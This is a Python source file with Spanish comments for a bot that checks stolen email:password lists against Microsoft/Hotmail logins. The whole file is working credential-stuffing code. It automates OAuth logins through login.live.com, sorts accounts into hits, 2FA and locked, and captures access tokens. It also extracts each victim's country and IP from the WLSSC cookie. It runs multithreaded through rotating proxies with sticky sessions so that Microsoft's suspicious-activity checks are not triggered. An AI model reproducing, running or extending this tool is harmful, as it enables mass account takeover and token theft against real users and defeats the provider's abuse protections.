"""
═══════════════════════════════════════════════════════════════
  HJ ULP EXTRACTOR BOT — Hotmail/Microsoft Account Checker
═══════════════════════════════════════════════════════════════
  • Adaptado del script MS Account Checker v4.1-wlssc by HacheJota
  • Login por OAuth RPS (login.live.com/oauth20_authorize.srf)
  • Clasifica: HIT / BAD / 2FA / LOCKED / UNKNOWN / ERROR
  • Extrae país + IP desde la cookie WLSSC (formato binario)
  • Soporta proxies: HTTP, HTTPS, SOCKS5, con o sin auth
  • ThreadPoolExecutor para paralelizar
═══════════════════════════════════════════════════════════════
"""

import os
import re
import base64
import time
import threading
from urllib.parse import quote, unquote
from pathlib import Path
from typing import List, Optional, Dict
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

from logger_setup import logger
from hotmail_paises import get_country_info, get_name_from_iso, get_flag_from_iso

# ── Config ──────────────────────────────────────────────────
HOTMAIL_TIMEOUT = 20
MAX_HOTMAIL_WORKERS = 20
MAX_HOTMAIL_COMBOS = 2500  # tope duro: si mandan 5K, solo se procesan 2.5K
_write_lock = threading.Lock()

# PPFT fallback (extraído de una sesión real de login.live.com)
FALLBACK_PPFT = (
    "-Dim7vMfzjynvFHsYUX3COk7z2NZzCSnDj42yEbbf18uNb%21Gl%21I9kGKmv895GTY7Ilpr2XXnnVtOSLIiqU"
    "%21RssMLamTzQEfbiJbXxrOD4nPZ4vTDo8s*CJdw6MoHmVuCcuCyH1kBvpgtCLUcPsDdx09kFqsWFDy9co"
    "%21nwbCVhXJ*sjt8rZhAAUbA2nA7Z%21GK5uQ%24%24"
)

# ── Regex para extraer PPFT y urlPost del HTML ──────────────
RE_PPFT_V1 = re.compile(r'name="PPFT"\s+value="([^"]+)"')
RE_PPFT_V2 = re.compile(r'id="i0327"\s+value="([^"]+)"')
RE_PPFT_V3 = re.compile(r'value="([^"]{50,})"\s+name="PPFT"')
RE_PPFT_V4 = re.compile(r'"PPFT"\s*:\s*"([^"]+)"')
RE_PPFT_V5 = re.compile(r"PPFT['\"]?\s*[:=]\s*['\"]([^'\"]{20,})['\"]")
RE_PPFT_V6 = re.compile(r'sFTTag.*?value="([^"]+)"', re.DOTALL)
RE_PPFT_V7 = re.compile(r'name=\\?"PPFT\\?"[^>]*value=\\?"([^"\\]+)\\?"')
RE_PPFT_URLENC = re.compile(r'PPFT%3D([^%&"\']+)')
RE_URLPOST = re.compile(r'urlPost["\']?\s*[:=]\s*["\']([^"\']+)["\']')

# ── Estados posibles ────────────────────────────────────────
STATUS_HIT = "HIT"
STATUS_BAD = "BAD"
STATUS_2FA = "2FA"
STATUS_LOCKED = "LOCKED"
STATUS_UNKNOWN = "UNKNOWN"
STATUS_ERROR = "ERROR"


# ═════════════════════════════════════════════════════════════
#  EXTRACTOR DE PAÍS DESDE COOKIE WLSSC (v4.1 by HacheJota)
# ═════════════════════════════════════════════════════════════
#  La cookie WLSSC contiene el país en formato binario.
#  Estructura observada:
#      [email][1-2 bytes variables][2 letras MAYÚSCULAS][\x00]
#  donde las 2 letras son el código ISO del país (TR, CO, MX, US, ...).
#
#  Ejemplos reales:
#      TR: 00 00 00 07 54 52 00
#      CO: 00 00 0d 13 43 4f 00
#      MX: 00 00 00 32 4d 58 00
# ═════════════════════════════════════════════════════════════

# Patrones para extraer ISO del país desde la cookie WLSSC decodificada.
# Ordenados por especificidad (más restrictivos primero).
_WLSSC_PATTERNS = [
    # V1: 00 00 [XX] 00 (más específico)
    re.compile(rb'\x00\x00[\x00-\xff]{1,2}([A-Z]{2})\x00'),
    # V2: 00 00 00 [XX] 00
    re.compile(rb'\x00\x00\x00[\x00-\xff]{0,2}([A-Z]{2})\x00'),
    # V3: [ctrl] XX [ctrl] (más laxa)
    re.compile(rb'[\x00-\x1f]([A-Z]{2})[\x00-\x1f]'),
]

# Patrón para extraer IP de la cookie WLSSC
_WLSSC_IP_PATTERN = re.compile(rb'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')


def extract_country_from_wlssc(wlssc_b64: str, email: str) -> Optional[str]:
    """Extraer código ISO del país desde la cookie WLSSC de Microsoft.

    La cookie viene en base64. Al decodificarla, contiene un bloque binario
    con el email y, después, 2 bytes ASCII con el código ISO del país
    terminados en \\x00.

    Returns:
        ISO de 2 letras (ej: 'AR', 'MX', 'US') o None si no se encuentra.
    """
    if not wlssc_b64:
        return None

    try:
        data = base64.b64decode(wlssc_b64)
    except Exception:
        return None

    if not data:
        return None

    # Localizar el SEGUNDO email (el país viene después del segundo)
    email_bytes = email.encode("ascii", errors="ignore").lower()
    idx1 = data.lower().find(email_bytes)
    idx2 = data.lower().find(email_bytes, idx1 + len(email_bytes)) if idx1 >= 0 else -1

    if idx2 >= 0:
        search_from = idx2
    elif idx1 >= 0:
        search_from = idx1
    else:
        search_from = 0

    # Buscar SOLO después del email encontrado
    region = data[search_from:] if search_from > 0 else data

    for pattern in _WLSSC_PATTERNS:
        m = pattern.search(region)
        if m:
            iso = m.group(1).decode("ascii", errors="ignore")
            if iso and len(iso) == 2:
                return iso.upper()

    return None


def extract_ip_from_wlssc(wlssc_b64: str) -> Optional[str]:
    """Extraer la IP de salida del usuario desde la cookie WLSSC."""
    if not wlssc_b64:
        return None
    try:
        data = base64.b64decode(wlssc_b64)
    except Exception:
        return None
    m = _WLSSC_IP_PATTERN.search(data)
    if m:
        return m.group(1).decode("ascii", errors="ignore")
    return None


def parse_proxy(proxy_str: str) -> Optional[str]:
    """Convertir un string de proxy en formato URL estándar.

    Acepta TODOS los formatos (rotativas y estáticas):
      - http://host:port
      - https://host:port
      - socks5://host:port
      - socks5://user:pass@host:port
      - host:port
      - host:port:user:pass
      - user:pass@host:port
      - host:port user:pass  (con espacio — caso típico de proxies rotativas)
      - http://host:port user:pass  (URL + credenciales separadas por espacio)
      - http://host:port -U user:pass  (formato curl)
      - socks5://host:port user:pass
      - "http://host:port" "user:pass"  (con comillas)

    Si la proxy es rotativa (cambia IP en cada request) se usa igual;
    requests/urllib3 resolverá IPs distintas automáticamente.

    Retorna:
      String URL lista para requests, o None si el input está vacío.
    """
    if not proxy_str:
        return None

    s = proxy_str.strip()
    if not s:
        return None

    # Quitar comillas externas
    s = s.strip('"\'').strip()
    if not s:
        return None

    # Quitar flags tipo -U, -x, --proxy que el usuario podría pegar del curl
    # Ej: "http://host:port -U user:pass" → "http://host:port user:pass"
    s = re.sub(r'\s+-[UxX]\s+', ' ', s)
    s = re.sub(r'\s+--proxy\s+', ' ', s)
    s = re.sub(r'\s+--proxy-user\s+', ' ', s)
    s = s.strip()

    # Detectar scheme
    has_scheme = s.startswith((
        'http://', 'https://', 'socks5://', 'socks4://', 'socks://'
    ))

    # Caso 1: hay un ESPACIO → URL/host por un lado, credenciales por otro
    # Formato: "host:port user:pass" o "http://host:port user:pass"
    if ' ' in s:
        parts = s.split(None, 1)
        url_part = parts[0].strip().strip('"\'')
        creds_part = parts[1].strip().strip('"\'')

        # Asegurar scheme en url_part
        if not url_part.startswith((
            'http://', 'https://', 'socks5://', 'socks4://', 'socks://'
        )):
            url_part = 'http://' + url_part

        # Parsear scheme://host:port
        m = re.match(r'^(https?|socks[45]?)://(.+)$', url_part)
        if m:
            scheme, host_part = m.group(1), m.group(2)
            # Validar que creds_part parece "user:pass"
            if ':' in creds_part:
                user, _, pw = creds_part.partition(':')
                return f"{scheme}://{quote(user, safe='')}:{quote(pw, safe='')}@{host_part}"
            # Sin ':' → solo user sin pass
            return f"{scheme}://{quote(creds_part, safe='')}@{host_part}"
        # Fallback
        return url_part

    # Caso 2: "host:port:user:pass" (4 partes, 2da es número)
    if s.count(':') == 3:
        h, p, u, pw = s.split(':')
        if p.isdigit():
            return f"http://{quote(u, safe='')}:{quote(pw, safe='')}@{h}:{p}"

    # Caso 3: "user:pass@host:port" (sin scheme)
    if '@' in s and not has_scheme:
        # Asumir HTTP
        return f"http://{s}"

    # Caso 4: "host:port" (1 solo ':' y port es número)
    if s.count(':') == 1:
        h, p = s.split(':', 1)
        if p.isdigit():
            return f"http://{s}"

    # Caso 5: ya tiene scheme → usar tal cual
    if has_scheme:
        return s

    # Fallback: asumir HTTP
    return f"http://{s}"


# ═════════════════════════════════════════════════════════════
#  STICKY SESSION POR COMBO (para proxies rotativas)
# ═════════════════════════════════════════════════════════════
#  Las proxies rotativas (flameproxies, brightdata, oxylabs, ...)
#  cambian de IP en cada request. Eso rompe el login de Microsoft
#  porque:
#    1. GET authorize.srf → cookies de sesión con IP-A
#    2. POST login → misma cookie pero desde IP-B distinta
#    3. Microsoft ve "cambio de IP mid-session" → sirve página de
#       "actividad sospechosa" → el clasificador no la reconoce → UNKNOWN
#
#  Solución: agregar un session_id al username de la proxy para que
#  el provider mantenga la misma IP durante toda la sesión del combo.
#  Formato: 'user-session-<id>:pass@host:port'
#  Soportado por: flameproxies, brightdata, oxylabs, smartproxy, etc.
# ═════════════════════════════════════════════════════════════

_STICKY_SESSION_RE = re.compile(r'^(\w+://)([^:@/]+):([^@/]+)@(.+)$')


def add_sticky_session(proxy_url: str, session_id: str) -> str:
    """Agregar un session_id al username de la proxy para mantener IP estable.

    Formato resultante: scheme://user-session-<id>:pass@host:port

    Si la proxy no tiene auth (user:pass) o ya tiene un session_id,
    se devuelve sin modificar (no se puede agregar sticky session).
    """
    if not proxy_url or not session_id:
        return proxy_url

    m = _STICKY_SESSION_RE.match(proxy_url)
    if not m:
        return proxy_url  # sin auth o formato no soportado

    scheme, user, pw, host = m.group(1), m.group(2), m.group(3), m.group(4)

    # Si el user ya tiene un session_id, no agregar otro
    if '-session-' in user or '-sessid-' in user or '_session-' in user:
        return proxy_url

    new_user = f"{user}-session-{session_id}"
    return f"{scheme}{quote(new_user, safe='')}:{quote(pw, safe='')}@{host}"


# ═════════════════════════════════════════════════════════════
#  DETECCIÓN DE PROXY ROTATIVA vs ESTÁTICA
# ═════════════════════════════════════════════════════════════
#  Una proxy ROTATIVA (ej: flameproxies) devuelve IPs distintas en
#  cada request. Una ESTÁTICA siempre devuelve la misma IP.
#  Hacemos 2 requests seguidas a httpbin.org/ip y comparamos.
# ═════════════════════════════════════════════════════════════

_IP_CHECK_URL = "https://httpbin.org/ip"
_IP_CHECK_URLS = [
    "https://httpbin.org/ip",
    "https://api.ipify.org?format=json",
    "https://ifconfig.me/all.json",
]


def _fetch_ip_via_proxy(proxy_url: str, timeout: int = 10) -> Optional[str]:
    """Hacer un GET a httpbin.org/ip vía la proxy y devolver la IP de salida."""
    session = _build_session(proxy_url)
    try:
        for url in _IP_CHECK_URLS:
            try:
                r = session.get(url, timeout=timeout, verify=False)
                if r.status_code == 200:
                    data = r.json()
                    # httpbin.org/ip → {"origin": "1.2.3.4"}
                    # ipify → {"ip": "1.2.3.4"}
                    # ifconfig.me → {"ip_addr": "1.2.3.4"}
                    ip = data.get("origin") or data.get("ip") or data.get("ip_addr")
                    if ip:
                        return ip.split(",")[0].strip()
            except Exception:
                continue
    finally:
        try:
            session.close()
        except Exception:
            pass
    return None


def detect_proxy_type(proxy_url: str) -> dict:
    """Detectar si una proxy es rotativa o estática.

    Hace 2 requests seguidas y compara las IPs de salida:
      - Si las IPs son distintas → ROTATIVA (cambia IP en cada request)
      - Si las IPs son iguales → ESTÁTICA (siempre misma IP)
      - Si ninguna request funciona → ERROR

    Returns:
        {
            'type': 'rotating' | 'static' | 'error',
            'ip1': 'primera IP vista',
            'ip2': 'segunda IP vista',
            'error': 'mensaje si falla'  # solo si type='error'
        }
    """
    ip1 = _fetch_ip_via_proxy(proxy_url)
    if not ip1:
        return {"type": "error", "ip1": None, "ip2": None,
                "error": "no se pudo conectar a la proxy"}

    ip2 = _fetch_ip_via_proxy(proxy_url)
    if not ip2:
        # La 2da falló pero la 1ra funcionó → asumimos estática
        return {"type": "static", "ip1": ip1, "ip2": None,
                "error": "segunda request falló"}

    if ip1 != ip2:
        return {"type": "rotating", "ip1": ip1, "ip2": ip2, "error": None}
    else:
        return {"type": "static", "ip1": ip1, "ip2": ip2, "error": None}


def _build_session(proxy: Optional[str] = None) -> requests.Session:
    """Crear una sesión HTTP con headers de navegador y proxy opcional."""
    s = requests.Session()
    retry = Retry(
        total=1,
        backoff_factor=0.5,
        status_forcelist=[502, 503, 504],
        allowed_methods=["GET", "POST"],
    )
    adapter = HTTPAdapter(max_retries=retry, pool_connections=5, pool_maxsize=20)
    s.mount("http://", adapter)
    s.mount("https://", adapter)

    s.headers.update({
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0"
        ),
        "Accept-Language": "en-US,en;q=0.9",
    })
    s.verify = False  # Microsoft a veces tiene cert issues con proxies

    if proxy:
        s.proxies = {"http": proxy, "https": proxy}

    return s


def _get_ppft(session: requests.Session, email: str) -> tuple:
    """Hacer GET a authorize.srf y extraer (ppft, url_post).

    Retorna (None, None) si falla la red.
    """
    url_auth = (
        "https://login.live.com/oauth20_authorize.srf"
        "?client_id=0000000048170EF2"
        "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
        "&response_type=token"
        "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
        "&display=touch"
        f"&username={quote(email)}"
    )

    try:
        r = session.get(url_auth, timeout=HOTMAIL_TIMEOUT,
                        verify=False, allow_redirects=True)
    except requests.exceptions.RequestException as e:
        logger.debug(f"[HOTMAIL] GET authorize.srf error red {email}: {e}")
        return None, None

    html = r.text or ""

    # Probar 7 patrones + URL-encoded + fallback
    ppft = None
    for rx in (RE_PPFT_V1, RE_PPFT_V2, RE_PPFT_V3, RE_PPFT_V4,
               RE_PPFT_V5, RE_PPFT_V6, RE_PPFT_V7):
        m = rx.search(html)
        if m:
            ppft = m.group(1)
            break

    if not ppft:
        m = RE_PPFT_URLENC.search(html)
        if m:
            ppft = unquote(m.group(1))

    if not ppft:
        ppft = FALLBACK_PPFT

    url_post = None
    m = RE_URLPOST.search(html)
    if m:
        url_post = m.group(1).replace("\\/", "/")

    if not url_post:
        url_post = (
            "https://login.live.com/ppsecure/post.srf"
            "?client_id=0000000048170EF2"
            "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
            "&response_type=token"
            "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
            "&display=touch"
            f"&username={quote(email)}"
        )

    return ppft, url_post


def _classify_result(r, session: requests.Session) -> tuple:
    """Clasificar la respuesta del POST de login.

    Retorna (status, access_token_or_None).
    """
    body = r.text or ""
    final_url = str(r.url or "")
    access_token = None

    # ¿Tiene access_token en la URL final?
    if "access_token=" in final_url:
        try:
            access_token = final_url.split("access_token=")[1].split("&")[0]
        except Exception:
            pass

    # 1) HIT directo: access_token en la URL
    if access_token:
        return STATUS_HIT, access_token

    # 2) Examinar el body
    low = body.lower()

    if ("your account or password is incorrect" in low or
        "that microsoft account doesn" in low or
        "account doesn\\'t exist" in low):
        return STATUS_BAD, None

    if ("account.live.com/recover" in low or
        "account.live.com/identity/confirm" in low or
        "email/confirm" in low or
        "proofs/verify" in low or
        "verify your identity" in low):
        return STATUS_2FA, None

    if (",ac:null,urlfedconvertrename" in low or
        "/cancel?mkt=" in body or
        "/abuse?mkt=" in body):
        return STATUS_LOCKED, None

    # 3) Fallback por cookies
    cookie_names = {c.name for c in session.cookies}
    if {"ANON", "WLSSC"} & cookie_names:
        return STATUS_HIT, None

    return STATUS_UNKNOWN, None


def _worker(combo: str, proxy: Optional[str] = None) -> Optional[dict]:
    """Procesar un solo combo email:pass.

    Estrategia sticky session: si la proxy es rotativa, le agregamos
    un session_id único por combo para que el provider mantenga la
    misma IP durante toda la sesión del combo (GET + POST).
    Sin esto, las proxies rotativas rompen el login de Microsoft
    porque la cookie de sesión se setea con IP-A y se usa con IP-B.

    Retorna dict con:
        combo, status, access_token (opcional), proxy
    o None si el combo no tiene formato válido.
    """
    if ":" not in combo:
        return None

    user, password = combo.split(":", 1)
    user = user.strip()
    password = password.strip()

    if not user or not password or "@" not in user:
        return None

    # ── Sticky session por combo ──
    # Generar un session_id único de 8 chars (UUID4 truncado) por combo.
    # Si la proxy es rotativa, esto fuerza al provider a mantener la misma
    # IP durante GET + POST del mismo combo (evita el "cambio de IP mid-session"
    # que Microsoft detecta como actividad sospechosa).
    # Si la proxy es estática o no soporta sticky sessions, no pasa nada —
    # el formato '-session-<id>' se ignora y la proxy funciona igual.
    actual_proxy = proxy
    if proxy:
        import uuid as _uuid
        session_id = _uuid.uuid4().hex[:8]
        actual_proxy = add_sticky_session(proxy, session_id)

    session = _build_session(actual_proxy)

    try:
        ppft, url_post = _get_ppft(session, user)
        if not ppft:
            return {"combo": combo, "status": STATUS_ERROR,
                    "proxy": proxy or "direct"}

        payload = {
            "ps": "2",
            "psRNGCDefaultType": "",
            "psRNGCEntropy": "",
            "psRNGCSLK": "",
            "canary": "",
            "ctx": "",
            "hpgrequestid": "",
            "PPFT": ppft,
            "PPSX": "PassportRN",
            "NewUser": "1",
            "FoundMSAs": "",
            "fspost": "0",
            "i21": "0",
            "CookieDisclosure": "0",
            "IsFidoSupported": "1",
            "isSignupPost": "0",
            "isRecoveryAttemptPost": "0",
            "i13": "1",
            "login": user,
            "loginfmt": user,
            "type": "11",
            "LoginOptions": "1",
            "lrt": "",
            "lrtPartition": "",
            "hisRegion": "",
            "hisScaleUnit": "",
            "passwd": password,
        }

        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://login.live.com",
            "Referer": "https://login.live.com/",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        }

        try:
            r = session.post(
                url_post,
                data=payload,
                headers=headers,
                timeout=HOTMAIL_TIMEOUT,
                verify=False,
                allow_redirects=True,
            )
        except requests.exceptions.RequestException as e:
            return {"combo": combo, "status": STATUS_ERROR,
                    "error": str(e)[:200], "proxy": proxy or "direct"}

        status, access_token = _classify_result(r, session)

        result = {
            "combo": combo,
            "status": status,
            "access_token": access_token,
            "proxy": proxy or "direct",
        }

        # Si es HIT, extraer país + IP desde la cookie WLSSC
        if status == STATUS_HIT:
            try:
                wlssc = None
                for c in session.cookies:
                    if c.name == "WLSSC":
                        wlssc = c.value
                        break

                if wlssc:
                    iso = extract_country_from_wlssc(wlssc, user)
                    if iso:
                        result["iso"] = iso
                        name, flag = get_country_info(iso)
                        result["country"] = name
                        result["flag"] = flag

                    ip = extract_ip_from_wlssc(wlssc)
                    if ip:
                        result["ip"] = ip
            except Exception as e:
                logger.debug(f"[HOTMAIL] Error extrayendo país/IP para {user}: {e}")

        return result

    except Exception as e:
        return {"combo": combo, "status": STATUS_ERROR,
                "error": str(e)[:200], "proxy": proxy or "direct"}
    finally:
        try:
            session.close()
        except Exception:
            pass


def hotmail_check_file(input_path: Path, output_path: Path,
                       proxies: List[str] = None,
                       progress_callback=None) -> dict:
    """Checkear combos mail:pass contra Microsoft/Hotmail.

    Args:
        input_path: Archivo con combos (uno por línea)
        output_path: Archivo de salida para HITs (con access_token si lo hay)
        proxies: Lista opcional de proxies (cualquier formato, se reparten round-robin)
        progress_callback: fn(checked, total, hits)

    Returns:
        dict con: total, hits, bads, twofa, locked, unknowns, errors,
                  elapsed, hits_data (lista de dicts con detalle)
    """
    with open(input_path, 'r', encoding='utf-8', errors='ignore') as f:
        all_combos = [line.strip() for line in f if ":" in line.strip()]

    total_original = len(all_combos)
    # Tope duro: si mandan 5K, solo se procesan 2.5K (los primeros)
    if total_original > MAX_HOTMAIL_COMBOS:
        logger.warning(
            f"[HOTMAIL] Archivo tiene {total_original} combos — truncando a "
            f"{MAX_HOTMAIL_COMBOS} (tope máximo)"
        )
        combos = all_combos[:MAX_HOTMAIL_COMBOS]
    else:
        combos = all_combos

    total = len(combos)
    if total == 0:
        return {"total": 0, "total_original": total_original,
                "hits": 0, "bads": 0, "twofa": 0, "locked": 0,
                "unknowns": 0, "errors": 0, "elapsed": 0, "hits_data": []}

    # Parsear proxies una sola vez
    parsed_proxies = [parse_proxy(p) for p in proxies] if proxies else []
    parsed_proxies = [p for p in parsed_proxies if p]  # descartar inválidos

    if parsed_proxies:
        logger.info(f"[HOTMAIL] Check con {len(parsed_proxies)} proxy(s) "
                    f"para {total} combos")
    else:
        logger.info(f"[HOTMAIL] Check directo (sin proxy) para {total} combos")

    hits_data = []
    bads_list = []
    twofa_list = []
    locked_list = []
    unknown_list = []
    error_list = []
    checked = 0
    start_time = time.time()

    workers = min(MAX_HOTMAIL_WORKERS, max(1, total))

    with ThreadPoolExecutor(max_workers=workers,
                           thread_name_prefix="hotmail") as executor:
        # Asignar proxy round-robin a cada combo
        future_to_combo = {}
        for idx, combo in enumerate(combos):
            proxy = parsed_proxies[idx % len(parsed_proxies)] if parsed_proxies else None
            future_to_combo[executor.submit(_worker, combo, proxy)] = combo

        for future in as_completed(future_to_combo):
            combo = future_to_combo[future]
            try:
                result = future.result()
            except Exception as e:
                result = {"combo": combo, "status": STATUS_ERROR,
                          "error": str(e)[:200], "proxy": "unknown"}

            if not result:
                result = {"combo": combo, "status": STATUS_ERROR,
                          "error": "formato inválido", "proxy": "unknown"}

            status = result.get("status", STATUS_ERROR)

            if status == STATUS_HIT:
                hits_data.append(result)
            elif status == STATUS_BAD:
                bads_list.append(combo)
            elif status == STATUS_2FA:
                twofa_list.append(result)
            elif status == STATUS_LOCKED:
                locked_list.append(result)
            elif status == STATUS_UNKNOWN:
                unknown_list.append(result)
            else:
                error_list.append(result)

            with _write_lock:
                checked += 1

            if progress_callback and checked % 3 == 0:
                try:
                    progress_callback(checked, total, len(hits_data))
                except Exception:
                    pass

    # Escribir archivo de hits: SOLO mail:pass (sin token, sin extras)
    with open(output_path, 'w', encoding='utf-8', buffering=1024 * 64) as f:
        for h in hits_data:
            f.write(h["combo"] + "\n")

    elapsed = time.time() - start_time
    stats = {
        "total": total,
        "total_original": total_original,
        "truncated": total_original > total,
        "hits": len(hits_data),
        "bads": len(bads_list),
        "twofa": len(twofa_list),
        "locked": len(locked_list),
        "unknowns": len(unknown_list),
        "errors": len(error_list),
        "elapsed": elapsed,
        "hits_data": hits_data,
        "twofa_data": twofa_list,
        "locked_data": locked_list,
        "unknown_data": unknown_list,
        "error_data": error_list,
        "proxies_used": len(parsed_proxies),
    }

    logger.info(
        f"[HOTMAIL] Check finalizado: {stats['hits']} hits / "
        f"{stats['twofa']} 2FA / {stats['locked']} locked / "
        f"{stats['bads']} bads / {stats['errors']} errors "
        f"de {stats['total']} en {elapsed:.1f}s"
    )
    return stats
